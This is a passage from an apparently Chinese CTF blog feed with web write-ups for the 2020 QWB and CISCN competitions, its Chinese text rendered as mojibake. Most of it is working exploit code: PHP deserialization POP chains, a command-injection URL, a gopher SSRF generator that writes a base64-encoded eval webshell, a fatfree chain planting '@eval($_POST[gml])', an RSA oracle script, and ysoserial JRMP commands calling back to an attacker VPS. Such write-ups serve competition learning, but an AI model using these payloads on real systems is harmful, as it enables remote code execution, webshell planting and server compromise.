class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;Must Be Yasuo!\n&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name = <span class="string">&quot;Lee Sin&quot;</span></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;KS();</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">   $data = str_replace(<span class="string">&#x27;\0*\0&#x27;</span>, chr(<span class="number">0</span>).<span class="string">&quot;*&quot;</span>.chr(<span class="number">0</span>), $data);</span><br><span class="line">   <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> jungle(<span class="string">&#x27;gml&#x27;</span>);</span><br><span class="line">$b = <span class="keyword">new</span> midsolo($a);</span><br><span class="line">$c = <span class="keyword">new</span> topsolo($b);</span><br><span class="line">$data = <span class="string">&#x27;O%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%00%2A%00\6eame%22%3Bs%3A3%3A%22gml%22%3B%7D%7D%7D&#x27;</span>;</span><br><span class="line">$data = urldecode($data);</span><br><span class="line">$data = <span class="string">&#x27;gml&quot;;s:8:&quot;password&quot;;&#x27;</span>.$data.<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">$username = <span class="string">&#x27;gml\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&#x27;</span>;</span><br><span class="line">$password = urlencode($data);</span><br><span class="line"><span class="keyword">echo</span> $username.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $password;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å¼ºç½‘å…ˆé”‹-ä¸»åŠ¨"><a href="#å¼ºç½‘å…ˆé”‹-ä¸»åŠ¨" class="headerlink" title="å¼ºç½‘å…ˆé”‹-ä¸»åŠ¨"></a>å¼ºç½‘å…ˆé”‹-ä¸»åŠ¨</h3><p>[<a href="http://39.96.23.228:10002/?ip=;cat%20*]">http://39.96.23.228:10002/?ip=;cat%20*]</a>(<a href="http://39.96.23.228:10002/?ip=;cat">http://39.96.23.228:10002/?ip=;cat</a> *)</p><h3 id="å¼ºç½‘å…ˆé”‹-Funhash"><a href="#å¼ºç½‘å…ˆé”‹-Funhash" class="headerlink" title="å¼ºç½‘å…ˆé”‹-Funhash"></a>å¼ºç½‘å…ˆé”‹-Funhash</h3><p>Md4é‚£ä¸ªç»•è¿‡ï¼Œéœ€è¦å­—ç¬¦0eå¼€å¤´ï¼Œåé¢éƒ½æ˜¯æ•°å­—ï¼Œå¹¶ä¸”md4çš„ç»“æœéœ€è¦æ˜¯ 0e[0-9]{30} çš„å½¢å¼ã€‚<a href="https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4é‡Œé¢æœ‰ç°æˆçš„æ•°ã€‚ç¬¬äºŒå…³æ•°ç»„ç»•è¿‡ï¼Œæ•°æ®åº“é‚£ä¸ªåº”è¯¥æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œmd5å«æœ‰">https://medium.com/@Asm0d3us/part-1-php-tricks-in-web-ctf-challenges-e1981475b3e4é‡Œé¢æœ‰ç°æˆçš„æ•°ã€‚ç¬¬äºŒå…³æ•°ç»„ç»•è¿‡ï¼Œæ•°æ®åº“é‚£ä¸ªåº”è¯¥æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œmd5å«æœ‰</a> â€˜orâ€™è¿™ç§ï¼Œä¸€ç•ªæœç´¢åœ¨<a href="https://cvk.posthaven.com/sql-injection-with-raw-md5-hashesé‡Œæ‰¾åˆ°äº†ç°æˆçš„æ•°ã€‚[http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928](http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928)">https://cvk.posthaven.com/sql-injection-with-raw-md5-hashesé‡Œæ‰¾åˆ°äº†ç°æˆçš„æ•°ã€‚[http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928](http://39.101.177.96/?hash1=0e001233333333333334557778889&amp;hash2[]=1&amp;hash3[]=2&amp;hash4=129581926211651571912466741651878684928)</a></p><h3 id="half-infiltration"><a href="#half-infiltration" class="headerlink" title="half_infiltration"></a>half_infiltration</h3><p>Ob_end_clean å¯¼è‡´ä»€ä¹ˆä¹Ÿä¸ä¼šè¾“å‡ºï¼Œéœ€è¦è§¦å‘å¼‚å¸¸ç›´æ¥é€€å‡ºï¼Œæ‰èƒ½ç»•è¿‡ã€‚è¦ååºåˆ—åŒ–ä¸¤ä¸ªå¯¹è±¡ï¼Œç¬¬ä¸€ä¸ªç”¨æ¥å–åˆ°$flagï¼Œç¬¬äºŒä¸ªç”¨å…¨å±€ $this è§¦å‘å¼‚å¸¸ï¼Œè¿™æ ·å°±ä¼šè¾“å‡ºäº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> $age,$sex,$num;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$age,$sex,$num</span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;sex = $sex;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;num = $num;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">$b = <span class="keyword">Array</span>(<span class="keyword">new</span> User(<span class="keyword">new</span> Pass(),<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;result&#x27;</span>),<span class="keyword">new</span> User(<span class="keyword">new</span> Pass(),<span class="string">&#x27;read&#x27;</span>,this));</span><br><span class="line"><span class="keyword">print</span> serialize($b);</span><br></pre></td></tr></table></figure><p><img src="/2020/08/28/2020-qwb/siixUdLyyYA0CgPrTYcrTGW7orUlSYJJg_fLnLixhR_ier_T5Vp-2Zmy_YK-LFgk2KQdudUfObrsfGQ9BPvh1F2kNp1AD_k_Wul3pWavrviitU88vtT9inzmxINfW0MlV4kBPqq0.png" alt="img"></p><p>UrläºŒæ¬¡ç¼–ç è¯»flagä¸æˆåŠŸï¼Œç„¶åå‘ç°40000ç«¯å£å¼€ç€webæœåŠ¡ï¼Œhtmlä»£ç å°±postä¸€ä¸ªfileå’Œcontentï¼Œåº”è¯¥æ˜¯å†™æ–‡ä»¶ã€‚æ¥ä¸‹æ¥å°±æ˜¯å†™shelläº†ï¼Œå†™äº†ä¸‰ä¸ªå¤šå°æ—¶ã€‚ã€‚ã€‚ç–¯ç‹‚å°è¯•ï¼Œå‘ç°æœ‰WAFï¼Œæ‰€ä»¥ç”¨php://filter/convert.base64-decode/resource æ­é…base64ç¼–ç æ¥å†™ï¼Œä½†æ˜¯è²Œä¼¼è¿‡æ»¤äº†=è¿™äº›ï¼Œå‡‘äº†ä¸ªæ²¡æœ‰=çš„payloadã€‚è€Œä¸”æ–‡ä»¶ä¸æ˜¯ç›´æ¥å†™åˆ°uploadsç›®å½•ï¼Œè®¿é—®index.phpè¿”å›ä¸€ä¸ªset-cookie,æ˜¯å†™åˆ°äº†PHPSESSIDçš„å€¼å¯¹åº”çš„æ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰€ä»¥gopherå‘åŒ…è¦æŒ‡å®šPHPSESSIDï¼Œè¿™ä¸ªå‘äº†å¾ˆä¹…ã€‚ã€‚ç”Ÿæˆgopher payloadçš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">exp=<span class="string">&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.26.98.147</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:45.0) Gecko/20100101 Firefox/45.0</span></span><br><span class="line"><span class="string">Accept: */*;</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="string">Cookie: PHPSESSID=gml</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 95</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">file=php://filter/convert.base64-decode/resource=gml.php&amp;content=PD89QGV2YWwoJF9HRVRbMl0pOz8%2b&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># print exp.split(&quot;\n&quot;)</span></span><br><span class="line">tmp = urllib.quote(exp)</span><br><span class="line">tmp = tmp.replace(<span class="string">&quot;%0A&quot;</span>,<span class="string">&quot;%0D%0A&quot;</span>)</span><br><span class="line"> </span><br><span class="line">result = <span class="string">&quot;_&quot;</span>+urllib.quote(tmp)</span><br><span class="line"> </span><br><span class="line">result=<span class="string">&quot;gopher://172.26.98.147:40000/&quot;</span>+result</span><br><span class="line"><span class="built_in">print</span> result</span><br></pre></td></tr></table></figure><p>æ‰“è¿‡å»ï¼š</p><p><img src="/2020/08/28/2020-qwb/nTFCbNjiuJVHnGXR8vO8p_hnw8wsgB44Hk3gjrbQYEVFEx1rYUMWP9UjIEmDYqQRo8fC3Q-zkoPiBcOY7qs37kmP3JKvklZkh1_5gLpx275KceTenCp89k1s1KVQuYAurHMFQwfh.png" alt="img"></p><p>å¯ä»¥ getshellï¼š</p><p><img src="/2020/08/28/2020-qwb/vISYtt8fRrUQCho2750osAU6hqwZbV7_SUbI0hlWzE-YX_EqfbIXwLCASw-BmITL1Dq31AQbg3erETg5H9Mixh4l9Bn8SVNajF1ZdSHTaEJVldYycZ9gGQw2T2kb4tRoxO28fXf8.png" alt="img"></p><h3 id="Dice2cry"><a href="#Dice2cry" class="headerlink" title="Dice2cry"></a>Dice2cry</h3><p>å‘abi.phpå‘äº†postè¯·æ±‚ï¼Œæ²¡æœ‰å…¶ä»–åŠŸèƒ½ï¼Œè¯•ä¸€ä¸‹æºç æ³„æ¼ï¼Œabi.php.bakæœ‰æºç ã€‚abi.phpé‡Œæ˜¯ä¸€ä¸ªç±»ä¼¼RSA parity oracleçš„ä¸œè¥¿ï¼Œä½†æ˜¯ä»–éœ€è¦ $_POST[â€˜this_is.ableâ€™] æ¥è®¾ç½®å¯†æ–‡ç»å°è¯•ï¼Œç”¨ this[is.able å¯ä»¥ç»•è¿‡ php å¯¹ . çš„è¿‡æ»¤</p><p>è´´ä¸Šé˜Ÿå‹ mcfx å¤§ä½¬çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie=<span class="string">&#x27;PHPSESSID=0ctstv9ecqte01n2nkj8fi8744; encrypto_flag=79113663305747837143444307328467025244358133313438256571587025766714023427438759740177304646998782229997099583059263540140676001606304937372556988230412073815119853730057831488053981148795567089107250487727369425980217048609105153253967274624991296087058702050452905877610820679017736577755477024222115641775; public_n=8f5dc00ef09795a3efbac91d768f0bff31b47190a0792da3b0d7969b1672a6a6ea572c2791fa6d0da489f5a7d743233759e8039086bc3d1b28609f05960bd342d52bffb4ec22b533e1a75713f4952e9075a08286429f31e02dbc4a39e3332d2861fc7bb7acee95251df77c92bd293dac744eca3e6690a7d8aaf855e0807a1157; public_e=010001&#x27;</span></span><br><span class="line">hd=&#123;<span class="string">&#x27;cookie&#x27;</span>:cookie&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getval</span>(<span class="params">x</span>):</span></span><br><span class="line">dt=&#123;<span class="string">&#x27;this[is.able&#x27;</span>:x&#125;</span><br><span class="line">r=requests.post(<span class="string">&#x27;http://106.14.66.189/abi.php&#x27;</span>,headers=hd,data=dt)</span><br><span class="line"><span class="keyword">return</span> r.json()[<span class="string">&#x27;num&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cookie.split(<span class="string">&#x27;; &#x27;</span>):</span><br><span class="line">a,b=i.split(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> a==<span class="string">&#x27;encrypto_flag&#x27;</span>:</span><br><span class="line">enc_flag=<span class="built_in">int</span>(b)</span><br><span class="line"><span class="keyword">elif</span> a==<span class="string">&#x27;public_n&#x27;</span>:</span><br><span class="line">n=<span class="built_in">int</span>(b,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">elif</span> a==<span class="string">&#x27;public_e&#x27;</span>:</span><br><span class="line">e=<span class="built_in">int</span>(b,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> getval(<span class="number">0</span>)==<span class="number">0</span></span><br><span class="line"></span><br><span class="line">flag3=getval(enc_flag)</span><br><span class="line">n3=n%<span class="number">3</span></span><br><span class="line">curn=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">a=<span class="number">3</span>**(pos+<span class="number">1</span>)</span><br><span class="line">b=<span class="built_in">pow</span>(a,e,n)</span><br><span class="line">t3=getval(enc_flag*b%n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line"><span class="keyword">if</span> (flag3*a-n3*(curn*<span class="number">3</span>+i))%<span class="number">3</span>==t3:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">curn=curn*<span class="number">3</span>+i</span><br><span class="line">l=curn*n//a</span><br><span class="line">r=(curn*n+n<span class="number">-1</span>)//a</span><br><span class="line">print(pos,l,r)</span><br><span class="line"><span class="keyword">if</span> l+<span class="number">1</span>==r:</span><br><span class="line">print(r.to_bytes(<span class="number">100</span>,<span class="string">&#x27;big&#x27;</span>))</span><br><span class="line">exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h3><p>Jdk 1.8ï¼Œååºåˆ—åŒ–å‰æœ‰WAFã€‚å¯ä»¥ç”¨ysoserial.exploit.JRMPListener CommonsCollections7æ‰“ï¼ˆ6å’Œ7åº”è¯¥éƒ½å¯ä»¥ï¼‰ï¼Œä¸ºäº†é€ƒé¿æ£€æµ‹ï¼Œä½¿ç”¨JRMPæ¨¡æ‹ŸRMI Clientåæ‰“ï¼Œå‚è€ƒï¼š<a href="https://tiaotiaolong.net/2020/04/12/JRMPListener-&&-JRMPClientä½¿ç”¨å°è®°/">https://tiaotiaolong.net/2020/04/12/JRMPListener-&amp;&amp;-JRMPClient%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</a>å‘½ä»¤æ‰§è¡Œå¡äº†å¾ˆä¹…ï¼Œå¥½åƒä¸èƒ½æœ‰å¼•å·ï¼Œsh -c åé¢çš„å‘½ä»¤ç©ºæ ¼ç”¨${IFS}ä¹Ÿæ­»æ´»ä¸è¡Œï¼Œæœ€åå‚è€ƒ<a href="https://chybeta.github.io/2017/08/15/å‘½ä»¤æ‰§è¡Œçš„ä¸€äº›ç»•è¿‡æŠ€å·§/">https://chybeta.github.io/2017/08/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a>ï¼Œç”¨$IFS$9æ‰å¯ä»¥ã€‚ã€‚ã€‚æµ‹è¯•çš„æ—¶å€™æ¯æ¬¡è¿˜éœ€è¦æ¢ç«¯å£ï¼Œä¸€ä¸ªç«¯å£ç¬¬äºŒæ¬¡å°±ä¸å¥½ç”¨äº†ï¼Œæ²¡æœ‰å›è¿ã€‚Vps ä¸Šæ‰§è¡Œï¼š</p><p><img src="/2020/08/28/2020-qwb/mx6vGXjZXUUflp5AP0Z0WvoOtC5ZqvWK6uTonALgu4hge9t9ICuU2ddWXRjjfExkb189jfdGr7utxt0CRxTxH8Ie8nwG61orWAHMTptSErbdA_pJv7Fm7FFCA3TpovnWcR86eEFO.png" alt="img"></p><p>å¼€å¯serverï¼Œç„¶åæœ¬åœ°ç”Ÿæˆpayloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar JRMPClient <span class="string">&#x27;vps:5562&#x27;</span> &gt; payload</span><br></pre></td></tr></table></figure><p>ç„¶åæœ¬åœ°å†æ‰“è¿‡å»ï¼Œè§¦å‘ååºåˆ—åŒ–:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line">proxy = &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line">exp = <span class="built_in">open</span>(<span class="string">&#x27;payload&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"> </span><br><span class="line">requests.post(<span class="string">&quot;http://39.101.166.142:8080/jdk_der&quot;</span>,data=exp,proxies=proxy)</span><br></pre></td></tr></table></figure><p>è®¿é—®æ—¥å¿—:</p><p><img src="/2020/08/28/2020-qwb/1.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 ciscn åˆèµ› writeup</title>
      <link href="/2020/08/21/2020-ciscn/"/>
      <url>/2020/08/21/2020-ciscn/</url>
      
        <content type="html"><![CDATA[<p>è¿™å›½èµ›äº”ä¸ª Web åŠ èµ·æ¥ä¸åˆ°200åˆ†ï¼ŒçœŸå®ã€‚</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>éœ€è¦é€šè¿‡ call_user_func_array è§¦å‘å­è¿›ç¨‹å´©æºƒï¼Œè¿›åˆ°çˆ¶è¿›ç¨‹é‡Œã€‚</p><p><code>?a=stream_socket_server</code></p><p>ï¼ˆè¿™æ˜¯å•¥ Web é¢˜â€¦ï¼‰</p><h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a>babyunserialize</h3><p>çœ‹åˆ° fatfreeï¼Œæƒ³åˆ°äº† WMCTF é‚£ä¸ªwebwebï¼Œdiffä¸€ä¸‹å‘ç°æŠŠåŸæ¥é‚£ä¸ªé“¾å­ insert æ–¹æ³•ç»™æ³¨é‡Šäº†ï¼Œå†æ‰¾ä¸ªåˆ«çš„ï¼Œæ‰¾åˆ°äº†\DB\jig ä¸‹çš„mapperç±»ï¼š</p><p><img src="/2020/08/21/2020-ciscn/image-20200821103709773.png" alt="image-20200821103709773"></p><p>æ”¹ä¸€ä¸‹expï¼Œå¯ä»¥RCEï¼Œsystemä¸€ä¸‹å‘ç°è¢«banäº†ï¼Œæƒ³åŠæ³•å…ˆå†™ä¸ªshellï¼Œä¸è¿‡è¿™ä¸ªcall_user_func_arrayç”¨èµ·æ¥æ¯”è¾ƒéš¾å—ã€‚</p><p><img src="/2020/08/21/2020-ciscn/image-20200821103823717.png" alt="image-20200821103823717"></p><p>å†çœ‹ä¸€ä¸‹diffç»“æœï¼Œå‘ç° insert æ–¹æ³•ç«Ÿç„¶å¤šäº† writeæ“ä½œï¼š</p><p><img src="/2020/08/21/2020-ciscn/image-20200821103418678.png" alt="image-20200821103418678"></p><p>ç›´æ¥å†™ shell å°±å¥½äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">db</span>;</span><br><span class="line">        <span class="keyword">protected</span> $file = <span class="string">&#x27;gmmml.php&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> $document = <span class="string">&#x27;&lt;?php @eval($_POST[gml]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$db</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Jig</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">format</span> = 0;</span><br><span class="line">        <span class="keyword">protected</span> $dir = <span class="string">&#x27;./&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">server</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$server</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server = $server;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $events;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$events</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">F3</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">events</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$events</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $a = <span class="keyword">new</span> DB\Jig();</span><br><span class="line">    $b = <span class="keyword">new</span> DB\Jig\Mapper($a);</span><br><span class="line">    $c = <span class="keyword">new</span> F3(<span class="keyword">array</span>(<span class="string">&#x27;disconnect&#x27;</span> =&gt; <span class="keyword">array</span>($b, <span class="string">&quot;insert&quot;</span>)));</span><br><span class="line">    $d = <span class="keyword">new</span> CLI\Agent($c);</span><br><span class="line">    $e = <span class="keyword">new</span> CLI\WS($d);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($e));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°shellï¼ŒæŠŠ PHP7 é‚£ä¸ªç»•è¿‡ disable_function çš„è„šæœ¬æä¸Šå»å°±å¥½äº†ã€‚</p><h3 id="RCEME"><a href="#RCEME" class="headerlink" title="RCEME"></a>RCEME</h3><p><a href="https://www.anquanke.com/post/id/212603#h2-9">https://www.anquanke.com/post/id/212603#h2-9</a>ï¼Œæœ€åä¸€ä¸ª exp ç›´æ¥æ‰“ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 